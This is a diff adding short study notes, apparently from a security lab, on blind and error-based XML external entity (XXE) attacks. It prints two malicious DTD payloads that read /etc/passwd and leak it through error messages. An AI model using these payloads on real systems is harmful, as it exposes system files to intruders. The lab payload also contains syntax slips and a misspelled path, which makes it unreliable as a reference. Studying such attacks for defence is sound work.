@@ -135,3 +135,18 @@ result: <![CDATA[ Content of etc/fstab ]]>
 <prodId>&file_content;<prodId>
 </data>
 
+Blind | Error Based XXE
+
+<!-- evil.dtd: -->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval <!ENTITY &#x25; exfiltrate SYSTEM 'file:///nonexistent/?x=%file;'>">
+%eval;
+%error;
+while I am getting error I get back the file content in the response
+
+LAB:
+exploit.dtd
+<!ENTITY % file SYSTEM "file:///etc/password">
+<!ENTITY % stack "<ENTITY &#x25; exfiltrate SYSTEM 'file:///sdfsdfsd/$file;'>">
+%stack;
+%exfiltrate;
